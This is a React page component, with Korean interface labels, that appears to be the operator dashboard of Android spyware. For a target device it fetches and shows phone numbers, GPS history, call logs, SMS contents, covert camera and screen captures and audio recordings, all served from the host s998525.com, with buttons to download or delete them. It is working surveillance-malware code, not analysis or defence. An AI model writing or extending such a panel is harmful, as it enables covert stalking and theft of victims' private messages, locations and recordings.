import ViewProfileInformationForm from "./partials/ViewProfileInformationForm";
import { Head } from "@inertiajs/react";
import { PageProps } from "@/types";
import SidebarMini from "@/layouts/partials/SidebarMini";
import { AppProvider } from "@/contexts/app-context";
import { useScreenSize } from "@/hooks/use-screen-size";
import axios from "axios";
import { useState } from "react";
import { Link } from "@inertiajs/react";
import PrimaryButton from "@/components/PrimaryButton";
export default function Detail({
  auth,
  status,
  detail,
  status_type,
}: PageProps<{
  status?: string;
  status_type?: string;
  detail: any;
}>) {
  const { width } = useScreenSize();
  const [phoneNumbers, setPhoneNumbers] = useState<{ phone_number: string }[]>(
    [],
  );
  const downloadAudio = (url: string) => {
    const link = document.createElement("a");
    link.href = url;
    link.download = url.split("/").pop() || "audio.mp3"; // Set the filename
    link.click();
  };
  const [signals, setSignals] = useState<
    { signal_strength: string; created_at: string }[]
  >([]);
  const [gpss, setGpss] = useState<{ gps: string; created_at: string }[]>([]);
  const [calls, setCalls] = useState<
    { number: string; type: string; date: string; created_at: string }[]
  >([]);
  const [smss, setSmss] = useState<
    { address: string; body: string; date: string; created_at: string }[]
  >([]);
  const [cameras, setCameras] = useState<
    { upfront: string; filename: string; created_at: string }[]
  >([]);
  const [screens, setScreens] = useState<
    { filename: string; created_at: string }[]
  >([]);
  const [audios, setAudios] = useState<
    { filename: string; created_at: string }[]
  >([]);
  const fetchPhone = async () => {
    try {
      const response = await axios.post(route("fetchPhone"), {
        android_id: detail.android_id,
      });
      setPhoneNumbers(response.data.phone_numbers);
    } catch (error) {
      console.error("Error updating:", error);
    }
  };
  const fetchSignal = async () => {
    try {
      const response = await axios.post(route("fetchSignal"), {
        android_id: detail.android_id,
      });
      setSignals(response.data.signals);
    } catch (error) {
      console.error("Error updating:", error);
    }
  };
  const fetchGps = async () => {
    try {
      const response = await axios.post(route("fetchGps"), {
        android_id: detail.android_id,
      });
      setGpss(response.data.gpss);
    } catch (error) {
      console.error("Error updating:", error);
    }
  };
  const fetchCalls = async () => {
    try {
      const response = await axios.post(route("fetchCalls"), {
        android_id: detail.android_id,
      });
      setCalls(response.data.calls);
    } catch (error) {
      console.error("Error updating:", error);
    }
  };
  const fetchSmss = async () => {
    try {
      const response = await axios.post(route("fetchSmss"), {
        android_id: detail.android_id,
      });
      setSmss(response.data.smss);
    } catch (error) {
      console.error("Error updating:", error);
    }
  };
  const fetchCameras = async () => {
    try {
      const response = await axios.post(route("fetchCamera"), {
        android_id: detail.android_id,
      });
      setCameras(response.data.cameras);
    } catch (error) {
      console.error("Error updating:", error);
    }
  };
  const fetchAudios = async () => {
    try {
      const response = await axios.post(route("fetchAudio"), {
        android_id: detail.android_id,
      });
      setAudios(response.data.audios);
    } catch (error) {
      console.error("Error updating:", error);
    }
  };
  const fetchScreens = async () => {
    try {
      const response = await axios.post(route("fetchScreen"), {
        android_id: detail.android_id,
      });
      setScreens(response.data.screens);
    } catch (error) {
      console.error("Error updating:", error);
    }
  };
  const removeItem = async (filename: string, filetype: string) => {
    try {
      const response = await axios.post(route("removeItem"), {
        android_id: detail.android_id,
        filename: filename,
        encFileName:
          filetype == "audio"
            ? filename.replace(/\.enc$/, ".3gp")
            : filename.replace(/\.enc$/, ".png"),
        filetype: filetype,
      });
      if (filetype == "camera") {
        setCameras(response.data.assets);
      }
      if (filetype == "screen") {
        setScreens(response.data.assets);
      }
      if (filetype == "audio") {
        setAudios(response.data.assets);
      }
    } catch (error) {
      console.error("Error updating:", error);
    }
  };
  return (
    <AppProvider>
      <Head title="나" />

      <div className="relative overflow-x-auto px-8">
        <p>AndroidID:{detail.android_id}</p>
        <p>Version:{detail.android_version}</p>
        <p>Model:{detail.model_name}</p>
        <p>Timing:{detail.timing}</p>
        <div className="my-4">
          <PrimaryButton className=" bg-[#07c160]" onClick={fetchPhone}>
            Phone Numbers Fetch
          </PrimaryButton>
          {phoneNumbers.map((phone) => {
            return (
              <p>
                {phone.phone_number == "Permission denied"
                  ? "없음"
                  : phone.phone_number}
              </p>
            );
          })}
        </div>
        <div className="my-4">
          <PrimaryButton className=" bg-[#07c160]" onClick={fetchSignal}>
            Signal Strength Fetch
          </PrimaryButton>
          {signals.map((signal) => {
            return (
              <p>
                {signal.signal_strength},{signal.created_at}
              </p>
            );
          })}
        </div>
        <div className="my-4">
          <PrimaryButton className=" bg-[#07c160]" onClick={fetchGps}>
            GPS Fetch
          </PrimaryButton>
          {gpss.map((gps) => {
            return (
              <p>
                {gps.gps},{gps.created_at}
              </p>
            );
          })}
        </div>
        <div className="my-4">
          <PrimaryButton className=" bg-[#07c160]" onClick={fetchCalls}>
            Call Logs
          </PrimaryButton>
          {calls.map((call) => {
            return (
              <p>
                {call.number}에서 {call.type}형식으로 {call.date}날자에
                전화하였으며 {call.created_at}에 로그가 찍힘
              </p>
            );
          })}
        </div>
        <div className="my-4">
          <PrimaryButton className=" bg-[#07c160]" onClick={fetchSmss}>
            SMS Logs
          </PrimaryButton>
          {smss.map((sms) => {
            return (
              <p>
                {sms.address}에서 {sms.body}내용으로{" "}
                {new Date(
                  Number(sms.date) * (sms.date < "10000000000" ? 1000 : 1),
                ).toLocaleString()}
                날자에 송수신하였으며 {sms.created_at}에 로그가 찍힘
              </p>
            );
          })}
        </div>
        <div className="my-4">
          <PrimaryButton className=" bg-[#07c160]" onClick={fetchCameras}>
            Camera
          </PrimaryButton>
          <div className="inline">
            {cameras.map((camera) => {
              return (
                <>
                  <img
                    src={`https://s998525.com/decrypted/${camera.filename.replace(/\.enc$/, ".png")}`}
                    className="h-auto w-[300px] "
                    alt=""
                  />
                  <p>This is {camera.upfront}</p>
                  <p>{camera.created_at}</p>
                  <PrimaryButton
                    onClick={() => removeItem(camera.filename, "camera")}
                    className="bg-[#ff0000]"
                  >
                    삭제
                  </PrimaryButton>
                </>
              );
            })}
          </div>
        </div>
        <div className="my-4">
          <PrimaryButton className=" bg-[#07c160]" onClick={fetchScreens}>
            Screen Captures
          </PrimaryButton>
          <div className="inline">
            {screens.map((screen) => {
              return (
                <>
                  <img
                    src={`https://s998525.com/decrypted/${screen.filename.replace(/\.enc$/, ".png")}`}
                    alt=""
                    className="h-auto w-[300px] "
                  />
                  <p>{screen.created_at}</p>
                  <PrimaryButton
                    onClick={() => removeItem(screen.filename, "screen")}
                    className="bg-[#ff0000]"
                  >
                    삭제
                  </PrimaryButton>
                </>
              );
            })}
          </div>
        </div>
        <div className="my-4">
          <PrimaryButton className=" bg-[#07c160]" onClick={fetchAudios}>
            Audio Recording
          </PrimaryButton>
          <div className="inline">
            {audios.map((audio) => {
              return (
                <>
                  <audio controls>
                    <source
                      src={`https://s998525.com/decrypted/${audio.filename.replace(/\.enc$/, ".3gp")}?t=${Date.now()}`}
                      type="audio/3gpp"
                    />
                    Your browser does not support the audio element.
                  </audio>
                  <p>{audio.created_at}</p>
                  <PrimaryButton
                    onClick={() => removeItem(audio.filename, "audio")}
                    className="bg-[#ff0000]"
                  >
                    삭제
                  </PrimaryButton>
                  <PrimaryButton
                    onClick={() =>
                      downloadAudio(
                        `https://s998525.com/decrypted/${audio.filename.replace(/\.enc$/, ".3gp")}`,
                      )
                    }
                    className="bg-[#ffff00]"
                  >
                    Download
                  </PrimaryButton>
                </>
              );
            })}
          </div>
        </div>
      </div>
    </AppProvider>
  );
}
